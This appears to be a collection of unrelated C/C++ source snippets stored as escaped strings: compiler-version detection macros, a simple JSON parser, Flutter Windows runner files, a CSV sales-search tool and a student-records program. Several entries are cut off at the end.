\"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "#include <string.h>\r\n#include <stdexcept>\r\n#include <cstdlib>\r\n\r\n#include \"parser.h\"\r\nusing namespace json_zbw::json;\r\n\r\nParser::Parser() : m_idx(0)\r\n{\r\n}\r\n\r\nParser::~Parser()\r\n{\r\n}\r\n\r\nvoid Parser::load(const string& str)\r\n{\r\n    m_str = str;\r\n    m_idx = 0;\r\n}\r\n\r\n//\u8df3\u8fc7\u65e0\u7528\u5b57\u7b26\r\nvoid Parser::skip_white_space()\r\n{\r\n    while (m_str[m_idx] == ' ' || m_str[m_idx] == '\\r' || m_str[m_idx] == '\\n' || m_str[m_idx] == '\\t')\r\n        m_idx++;\r\n}\r\n\r\n//\u83b7\u53d6\u5f53\u524d\u5b57\u7b26\uff0c\u5e76\u6307\u5411\u4e0b\u4e00\u5b57\u7b26\r\nchar Parser::get_next_token()\r\n{\r\n    skip_white_space();\r\n    return m_str[m_idx++];\r\n}\r\n\r\n//\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse()\r\n{\r\n    char ch = get_next_token();\r\n    switch (ch)\r\n    {\r\n    case 'n'://null\r\n    case 'N'://NULL\r\n        m_idx--;//\u6807\u8bb0\u7d22\u5f15\u56de\u9000\u4e00\u683c\uff0c\u5c06\u5f53\u524d\u4f4d\u5305\u542b\u5728\u68c0\u6d4b\u8303\u56f4\u5185\r\n        return parse_null();\r\n    case 't'://true\r\n    case 'T'://TRUE\r\n    case 'f'://false\r\n    case 'F'://FALSE\r\n        m_idx--;\r\n        return parse_bool();\r\n    case '-'://\u6570\u5b57\r\n    case '0':\r\n    case '1':\r\n    case '2':\r\n    case '3':\r\n    case '4':\r\n    case '5':\r\n    case '6':\r\n    case '7':\r\n    case '8':\r\n    case '9':\r\n        m_idx--;\r\n        return parse_number();\r\n    case '\"'://\u5b57\u7b26\u4e32\r\n        return Json(parse_string());\r\n    case '['://\u6570\u7ec4\r\n        return parse_array();\r\n    case '{'://\u5bf9\u8c61\r\n        return parse_object();\r\n    default:\r\n        break;\r\n    }\r\n    //\u51fa\u73b0\u5176\u5b83\u5b57\u7b26\u8df3\u51fa\r\n    std::cout << \"unexpected character in parse json\" << std::endl;\r\n    exit(0);\r\n}\r\n\r\n//\u7a7a\u503c\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse_null()\r\n{\r\n    if (m_str.compare(m_idx, 4, \"null\") == 0 || m_str.compare(m_idx, 4, \"NULL\") == 0)\r\n    {\r\n        m_idx += 4;\r\n        return Json();\r\n    }\r\n    //\u4e0b\u56db\u4f4d\u4e0eNULL\u6216null\u4e0d\u540c\r\n    std::cout << \"parse null error\" << std::endl;\r\n    exit(0);\r\n}\r\n\r\n//\u5e03\u5c14\u503c\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse_bool()\r\n{\r\n    if (m_str.compare(m_idx, 4, \"true\") == 0 || m_str.compare(m_idx, 4, \"TRUE\") == 0)\r\n    {\r\n        m_idx += 4;\r\n        return Json(true);\r\n    }\r\n    if (m_str.compare(m_idx, 5, \"false\") == 0 || m_str.compare(m_idx, 5, \"FALSE\") == 0)\r\n    {\r\n        m_idx += 5;\r\n        return Json(false);\r\n    }\r\n    //\u63a5\u4e0b\u6765\u7684\u5b57\u7b26\u4e32\u4e0d\u662fbool\u503c\r\n    std::cout << \"parse bool error\" << std::endl;\r\n    exit(0);\r\n}\r\n\r\n\r\n//\u6570\u5b57\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse_number()\r\n{\r\n    size_t pos = m_idx;\r\n\r\n    if (m_str[m_idx] == '-')\r\n        m_idx++;\r\n\r\n    //\u6574\u6570\u90e8\u5206\r\n    if (m_str[m_idx] == '0')\r\n    {\r\n        m_idx++;\r\n    }\r\n    else if (in_range(m_str[m_idx], '1', '9'))\r\n    {\r\n        m_idx++;\r\n        while (in_range(m_str[m_idx], '0', '9'))\r\n        {\r\n            m_idx++;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        //\u8be5\u5b57\u7b26\u4e0d\u57280-9\u8303\u56f4\u5185\r\n        std::cout << \"invalid character in number\" << std::endl;\r\n        exit(0);\r\n    }\r\n\r\n    if (m_str[m_idx] != '.')\r\n    {\r\n        return Json(std::atoi(m_str.c_str() + pos));\r\n    }\r\n\r\n    //\u5c0f\u6570\u90e8\u5206\r\n    m_idx++;\r\n    if (!in_range(m_str[m_idx], '0', '9'))\r\n    {\r\n        //\u8be5\u5b57\u7b26\u4e0d\u57280-9\u8303\u56f4\u5185\r\n        std::cout << \"at least one digit required in fractional part\" << std::endl;\r\n        exit(0);\r\n    }\r\n    while (in_range(m_str[m_idx], '0', '9'))\r\n    {\r\n        m_idx++;\r\n    }\r\n    return Json(std::atof(m_str.c_str() + pos));\r\n}\r\n\r\n//\u5b57\u7b26\u4e32\u89e3\u6790\u51fd\u6570\r\nstring Parser::parse_string()\r\n{\r\n    int pos = m_idx;    //\u4fdd\u5b58\u8d77\u59cb\u4f4d\u7f6e\r\n    while (true)\r\n    {\r\n        if (m_idx == m_str.size())\r\n        {\r\n            std::cout << \"unexpected end of input in string\" << std::endl;\r\n            exit(0);\r\n        }\r\n\r\n        char ch = m_str[m_idx++];\r\n        //\u8bfb\u5230\u201d\u8df3\u51fa\u5faa\u73af\r\n        if (ch == '\"')\r\n        {\r\n            break;\r\n        }\r\n        //\u9047\u5230\u8f6c\u4e49\u5b57\u7b26\r\n        if (ch == '\\\\')\r\n        {\r\n            ch = m_str[m_idx++];\r\n            switch (ch)\r\n            {\r\n            case 'b'://\u9000\u683c\r\n            case 't'://\u7f29\u8fdb\r\n            case 'n'://\u6362\u884c\r\n            case 'f'://\u6362\u9875\r\n            case 'r'://\u56de\u8f66\r\n            case '\"'://\u5f15\u53f7\r\n            case '\\\\':\r\n                break;\r\n            case 'u'://\u63a54\u5b57\u8282\r\n                m_idx += 4;\r\n                break;\r\n            default:\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    return m_str.substr(pos, m_idx - pos - 1);\r\n}\r\n\r\n//\u6570\u7ec4\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse_array()\r\n{\r\n    Json arr(Json::json_array);\r\n    char ch = get_next_token();\r\n    //\u4ee5 ] \u4f5c\u4e3a\u6570\u7ec4\u7ed3\u675f\u7684\u6807\u5fd7\r\n    if (ch == ']')\r\n    {\r\n        return arr;\r\n    }\r\n    m_idx--;\r\n    while (true)\r\n    {\r\n        //\u89e3\u6790\u5355\u72ec\u5143\u7d20\u540e\uff0c\u52a0\u5230\u6570\u7ec4\u7c7b\u578b\u4e2d\r\n        arr.append(parse());\r\n        ch = get_next_token();\r\n        if (ch == ']')\r\n        {\r\n            break;\r\n        }\r\n        //\u7f3a\u5c11\u201c\uff0c\u201d\r\n        if (ch != ',')\r\n        {\r\n            std::cout << \"expected ',' in array\" << std::endl;\r\n            exit(0);\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\n//\u5bf9\u8c61\u89e3\u6790\u51fd\u6570\r\nJson Parser::parse_object()\r\n{\r\n    Json obj(Json::json_object);\r\n    char ch = get_next_token();\r\n    //\u4ee5 } \u4f5c\u4e3a\u6570\u7ec4\u7ed3\u675f\u7684\u6807\u5fd7\r\n    if (ch == '}')\r\n    {\r\n        return obj;\r\n    }\r\n    m_idx--;\r\n    while (true)\r\n    {\r\n        ch = get_next_token();\r\n        //\u7f3a\u5c11 \u201d\r\n        if (ch != '\"')\r\n        {\r\n            std::cout << \"expected '\\\"' in object\" << std::endl;\r\n            exit(0);\r\n        }\r\n        string key = parse_string();\r\n  ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <iomanip>\n\nusing std::vector;\nusing std::cout;\nusing std::endl;\nusing std::cerr;\nusing std::string;\nusing std::stringstream;\nusing std::ofstream;\nusing std::ifstream;\n\nint main(int argc, char* argv[]) {\n\n    if (argc != 3) { // Validaci\u00f3n Input cout errors\n\t\tswitch (argc) {\n\t\tcase 1:\n\t\t\tcerr << \"ERROR -- Faltan 2 Par\u00e1metros.\\nUse:\\n\" << argv[0] << \" [./data/superstore.csv] [CA-2015-149587]\" << endl;\n\t\t\treturn 1;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcerr << \"ERROR -- Faltan 1 Par\u00e1metros.\\nUse:\\n\" << argv[0] << \" \" << argv[1] << \" [CA-2015-149587]\" << endl;\n\t\t\treturn 1;\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcerr << \"ERROR -- Ingres\u00f3 Demasiados Par\u00e1metros.\\nUse:\\n\" << argv[0] << \"[./build/basic-search] [./data/superstore.csv] [CA-2015-149587]\" << endl;\n\t\t\treturn 1;\n\t\t\tbreak;\t\t\t\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t} else {\n        string Filename = argv[1];\n        string KeyToSearch = argv[2];\n\n        ifstream SuperstoreFile;\n        string SuperstoreData;\n        vector<string> DataInfo;\n        vector<string> FixedDataInfo;\n        vector<string> Orders;\n        string Write = \"\";\n        string toWrite = \"\";\n        int RecordCount = 0;\n        float TotalSales = 0;\n\n        size_t charPosition;\n        vector<string>caracteresReplace = {\"\u2020\", \"\u2021\", \"\u2030\", \"\u00ec\", \"\u00ee\", \"\u02c6\", \"\u00c8\", \"\u00b8\", \"\u00e6\"};\n\n        SuperstoreFile.open(Filename);\n        if (!SuperstoreFile.fail()) {\n            while (getline(SuperstoreFile, SuperstoreData,'\\n')) {\n                for (size_t i = 0; i < SuperstoreData.size(); i++) { //Obtiene la informaci\u00f3n de cada Field\n                    if (SuperstoreData.at(i) == ',' || i+1 == SuperstoreData.size()) {\n                        DataInfo.push_back(Write);\n                        Write = \"\";\n                        continue;\n                    } else if (SuperstoreData.at(i) == '\\\"') {\n                        for (size_t j = i+1; j < SuperstoreData.size(); j++) {\n                            if (SuperstoreData.at(j) == '\\\"' && SuperstoreData.at(j+1) == ',') {\n                                DataInfo.push_back(Write);\n                                Write = \"\";\n                                i=j+1;\n                                break;\n                            } else {\n                                Write += SuperstoreData.at(j);\n                            }\n                        }\n                    } else {\n                        Write += SuperstoreData.at(i); //Prelim Write in case de Cambiar Caracteres\n                    }\n                }\n\n                                for\t(size_t g = 0; g < DataInfo.size(); g++){ //Reemplaza caracteres\n                    toWrite = DataInfo.at(g);\n                    for (size_t i = 0; i < caracteresReplace.size(); i++) {\n                        if (i < 2) {\n                            while ((charPosition = toWrite.find(caracteresReplace.at(i))) != string::npos) {\n                                toWrite.replace(charPosition, 3, \"   \");\n                            }\n                        } else {\n                            while ((charPosition = toWrite.find(caracteresReplace.at(i))) != string::npos) {\n                                toWrite.replace(charPosition, 2, \"   \");\n                            }\n                        }\n                    }\n\n                    FixedDataInfo.push_back(toWrite);\n                }\n                \n                for (size_t i = 0; i < FixedDataInfo.size(); ++i) {\n                    if (FixedDataInfo[1].compare(KeyToSearch) == 0) {\n                        Orders.push_back(FixedDataInfo[1]);\n                        Orders.push_back(FixedDataInfo[16]);\n                        Orders.push_back(FixedDataInfo[17]);\n                        Orders.push_back(FixedDataInfo[18]);\n                        Orders.push_back(FixedDataInfo[19]);\n                        TotalSales += (stof(FixedDataInfo[17])*(stoi(FixedDataInfo[18])*(1-(stof(FixedDataInfo[19])))));\n                        RecordCount++;\n                    }\n                    break;\n                }\n                for (size_t i = 0; i < Orders.size(); ++i) {\n                    if ( (i+1) % 5 == 0) {\n                        cout << Orders[i] << endl;\n                    } else {\n                        cout << Orders[i] << \",\";\n                    }\n                }\n                FixedDataInfo.clear();\n                DataInfo.clear();\n                Orders.clear();\n            }\n\n            cout << endl << \"Total Records: \" << RecordCount << endl << \"Total Sale: \" << TotalSales << endl;\n        } else {\n            cout << \"nel\" << endl;\n        }\n        SuperstoreFile.close();\n    }\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\n//Program of student Data Base using classes and objects\n//Muhammad Sharjeel Husnain\n\n#include <iostream>\n#include <string>\n#include<fstream>\n#define SIZE 70\nusing namespace std;\nstruct date {\n\tint day, month, year;\n};\nclass classStudent\n{\n\tdate doa, dob;\n\tint rollNo;\n\tstring stName, fName;\n\tfloat cgpa;\npublic:\n\tclassStudent(int d = 0, float q = 0.0, date = { 0,0,0 }) : rollNo(d), cgpa(q) {}; //initializing values using constructers\n\n\tvoid readDataBase();\n\tvoid display();\n\tbool search(int);\n\t\n};\nvoid disp();\nbool classStudent::search(int rolNo) {\n\tif (rolNo == rollNo) {\n\t\treturn true;\n\t}\n\telse {\n\t\treturn false;\n\t}\n}\nvoid storeData(classStudent st[], int n)\n{\n\tofstream outData;\n\toutData.open(\"Student.DAT\", ios::out | ios::binary);\n\tif (!outData.good())\n\t{\n\t\tcout << \"file not created\";\n\t\treturn;\n\t}\n\toutData.write((char*)&n, sizeof(int));\n\toutData.write((char*)st, n * sizeof(classStudent));\n\toutData.close();\n}\nvoid loadData(classStudent st[], int& n)\n{\n\tifstream inData;\n\tinData.open(\"Student.DAT\", ios::in | ios::binary);\n\tif (!inData.good())\n\t{\n\t\tcout << \"file can't read\";\n\t\treturn;\n\t}\n\n\n\tinData.read((char*)&n, sizeof(int));\n\tinData.read((char*)st, n * sizeof(classStudent));\n\n\n\n\n\tinData.close();\n}\nvoid loadDataPos(classStudent st[], int& n, int pos)\n{\n\tifstream inFile;\n\tinFile.open(\"Student.DAT\", ios::in | ios::binary);\n\tif (!inFile.good())\n\t{\n\t\tcout << \"file can't read\";\n\t\treturn;\n\t}/*inFile.read((char*)&n, sizeof(int));\n\tinFile.seekg(0, ios::end);\n\tint endp = inFile.tellg();\n\tint o = endp / sizeof(classStudent);\n\tcout << \"total persons are : \" << o << endl;\n\t*/\n\n\t\n\t/*inFile.seekg(pos+(n - 1) * sizeof(classStudent),ios::beg);*/\n\t/*inFile.read((char*)&n, sizeof(int));\n\tint neg = sizeof(classStudent);\n\tinFile.seekg(-1, ios::end);\n\tinFile.read((char*)st, n*sizeof(classStudent));*/\n\n\n\tinFile.read((char*)&n, sizeof(int));\n\tinFile.read((char*)st, n * sizeof(classStudent));\n\tinFile.close();\n\tpos -= 1;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (i == pos)\n\t\t{\n\t\t\tdisp();\n\t\t\tst[i].display();\n\t\t}\n\t}\n}\nvoid copyFile(string dest)\n{\n\tstring line;\n\tifstream inFile;\n\tofstream outFile;\n\toutFile.open(dest, ios::out | ios::binary);\n\tinFile.open(\"Student.DAT\", ios::in | ios::binary);\n\t\n\tif (inFile && outFile) {\n\n\t\twhile (getline(inFile, line)) {\n\t\t\toutFile << line << \"\\n\";\n\t\t}\n\n\t\tcout << \"Copy Finished \\n\";\n\n\t}\n\telse {\n\t\t\n\t\tcout<<\"Cannot read File\";\n\t}\n\tinFile.close();\n\toutFile.close();\n\n}\n\nvoid classStudent::readDataBase()\n{\n\tcout << \"enter Roll No\" << endl;\n\tcin >> rollNo;\n\tcout << \"enter Student name\" << endl;\n\tcin.ignore(10, '\\n');\n\tgetline(cin, stName);\n\tcout << \"enter father name\" << endl;\n\n\tgetline(cin, fName);\n\tcout << \"enter cgpa\" << endl;\n\tcin >> cgpa;\n\tcout << \"enter Date of birth day/month/year\" << endl;\n\tcin >> dob.day;\n\tcin >> dob.month;\n\tcin >> dob.year;\n\tcout << \"enter date of admission  day/month/year\" << endl;\n\tcin >> doa.day;\n\tcin >> doa.month;\n\tcin >> doa.year;\n\n\n}\n\nvoid classStudent::display()\n{\n\n\n\tcout << rollNo << \"\\t\"\n\t\t<< stName << \"\\t\"\n\t\t<< fName << \"\\t\\t\"\n\t\t<< cgpa << \"\\t\"\n\t\t<< dob.day << \"/\" << dob.month << \"/\" << dob.year << \"\\t\"\n\t\t<< doa.day << \"/\" << doa.month << \"/\" << doa.year << \"\\t\" << endl;\n\n\n}\nvoid disp()\n{\n\tcout << \"st#\\t\"\n\t\t<< \"Roll No\\t\"\n\t\t<< \"Name\\t\"\n\t\t<< \"Father name\\t\"\n\t\t<< \"cgpa\\t\"\n\t\t<< \"dob\\t\\t\"\n\t\t<< \"doa\" << endl;\n}\nint main()\n{\n\tint i, rolNo; //roll no that we have to search\n\tbool found; //returning value of search\n\tclassStudent st[SIZE];\n\tint n = 0;\t\t //n max number of students you want to enter \n\tint loadPos=0;\n\tdo {\n\n\t\tchar option;\n\t\tcout << \"*****Main Menu*****\" << endl;\n\t\tcout << \"1. Create Data Base\" << endl;\n\t\tcout << \"2. Append Record\" << endl;\n\t\tcout << \"3. Search Record\" << endl;\n\t\tcout << \"4. Update Record\" << endl;\n\t\tcout << \"5. Delete Data\" << endl;\n\t\tcout << \"6. Display Data\" << endl;\n\t\tcout << \"7. Store Data in Disk\" << endl;\n\t\tcout << \"8. Load Data from Disk\" << endl;\n\t\tcout << \"9. Load specific Data from Disk\" << endl;\n\t\tcout << \"c. Copy Source File \" << endl;\n\t\tcout << \"0. Exit\" << endl;\n\t\tcout << \"Select your desired option\" << endl;\n\t\tcin >> 